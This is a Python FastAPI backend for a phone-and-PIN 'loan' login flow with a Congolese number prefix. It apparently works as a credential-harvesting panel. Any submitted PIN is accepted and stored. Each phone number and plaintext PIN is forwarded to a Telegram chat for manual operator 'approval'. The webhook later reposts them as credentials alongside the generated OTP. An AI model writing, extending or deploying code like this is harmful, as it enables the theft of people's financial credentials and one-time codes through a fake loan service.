import json
import random
from uuid import uuid4
from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, BackgroundTasks, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware

from database import init_db, create_user, verify_user_pin, get_user
from telegram_bot import send_approval_request, answer_callback_query, edit_message
from approvals import (
    create_approval,
    set_approval_result,
    pending_approvals,
    approval_results,
    approval_phones,
)
from notifications import send_otp_sms, send_telegram_message

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize database on startup
init_db()

otp_store = {}
approval_pins = {}  # NEW: Stores PINs temporarily for admin review


class LoginRequest(BaseModel):
    phone_number: str
    pin: str


class OTPRequest(BaseModel):
    phone_number: str
    otp: str


class RegisterRequest(BaseModel):
    phone_number: str
    pin: str


def format_phone(phone: str) -> str:
    """Ensure phone number has +243 prefix."""
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:]
    if not phone.startswith("+243") and not phone.startswith("243"):
        return f"+243{phone}"
    if phone.startswith("243"):
        return f"+{phone}"
    return phone


@app.get("/")
def read_root():
    return {"status": "Backend is running"}


# --- REGISTER (one-time, for testing) ---
@app.post("/api/register")
async def register(request: RegisterRequest):
    full_phone = format_phone(request.phone_number)
    if create_user(full_phone, request.pin):
        return {"status": "success", "message": "User created"}
    return {"status": "error", "message": "User already exists"}


# --- LOGIN (returns approval_id immediately) ---
@app.post("/api/login")
async def login(request: LoginRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)

    # 1. Check user
    user = get_user(full_phone)
    if not user:
        create_user(full_phone, request.pin)
    else:
        if not verify_user_pin(full_phone, request.pin):
            return {"status": "error", "message": "Invalid PIN"}

    # 2. Create approval request
    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone
    approval_pins[approval_id] = request.pin  # ⭐ NEW: Save PIN for admin review

    # 3. ⭐ AWAIT the Telegram send — guarantees delivery on Render
    await send_approval_request(approval_id, full_phone, request.pin)

    # 4. Return approval_id so frontend can poll
    return {
        "status": "pending",
        "approval_id": approval_id,
        "message": "Waiting for admin approval..."
    }


# --- APPROVAL STATUS (frontend polls every 2s) ---
@app.get("/api/approval-status/{approval_id}")
async def approval_status(approval_id: str, background_tasks: BackgroundTasks):
    # Still waiting for admin action
    if approval_id in pending_approvals:
        return {"status": "pending"}

    # No pending, check for a result
    result = approval_results.get(approval_id)
    if result is None:
        return {"status": "expired"}

    # Rejected by admin
    if not result:
        approval_results.pop(approval_id, None)
        approval_phones.pop(approval_id, None)
        approval_pins.pop(approval_id, None)  # Clean up
        return {"status": "rejected"}

    # Approved — send OTP via SMS
    phone = approval_phones.pop(approval_id, None)
    approval_results.pop(approval_id, None)
    approval_pins.pop(approval_id, None)  # Clean up

    if not phone:
        return {"status": "error", "message": "Phone number missing"}

    otp = str(random.randint(1000, 9999))
    otp_store[phone] = otp

    background_tasks.add_task(send_otp_sms, phone, otp)
    background_tasks.add_task(
        send_telegram_message,
        f"✅ Approved. OTP <code>{otp}</code> sent to <code>{phone}</code>"
    )

    return {"status": "approved", "message": "OTP sent"}


# --- VERIFY OTP ---
@app.post("/api/verify-otp")
async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)
    expected = otp_store.get(full_phone)

    if expected and request.otp == expected:
        del otp_store[full_phone]
        return {"status": "success", "message": "Loan approved"}
    return {"status": "error", "message": "Invalid OTP"}


# --- TELEGRAM WEBHOOK (defensive version) ---
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    # 1. Safely parse the JSON body
    try:
        body = await request.body()
        if not body:
            print("Webhook called with empty body — ignoring")
            return {"ok": True}

        data = json.loads(body)
    except json.JSONDecodeError as e:
        print(f"Webhook JSON parse error: {e}")
        return {"ok": True}
    except Exception as e:
        print(f"Webhook read error: {e}")
        return {"ok": True}

    # 2. Ignore non-callback updates
    if "callback_query" not in data:
        print("Webhook received non-callback update — ignoring")
        return {"ok": True}

    # 3. Handle the callback query safely
    try:
        callback = data["callback_query"]
        callback_id = callback["id"]
        callback_data = callback.get("data", "")
        parts = callback_data.split(":")

        if len(parts) < 2:
            print(f"Invalid callback data: {callback_data}")
            return {"ok": True}

        action = parts[0]           # "approve" or "reject"
        approval_id = parts[1]
        approved = (action == "approve")

        # Mark the result in your in-memory store
        set_approval_result(approval_id, approved)

        # Acknowledge the button press (removes the Telegram spinner)
        await answer_callback_query(
            callback_id,
            "✅ Approved" if approved else "❌ Rejected"
        )

        # ⭐ NEW: Fetch the user's credentials to show in the message
        phone = approval_phones.get(approval_id, "Unknown")
        pin = approval_pins.get(approval_id, "Unknown")

        # Edit the original message to show the credentials
        if "message" in callback:
            result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
            await edit_message(
                chat_id=callback["message"]["chat"]["id"],
                message_id=callback["message"]["message_id"],
                text=f"{result_text}\n\n"
                     f"📱 Phone: <code>{phone}</code>\n"
                     f"🔑 PIN: <code>{pin}</code>\n"
                     f"🆔 Ref: <code>{approval_id}</code>"
            )

        return {"ok": True}

    except Exception as e:
        print(f"Webhook processing error: {e}")
        return {"ok": True}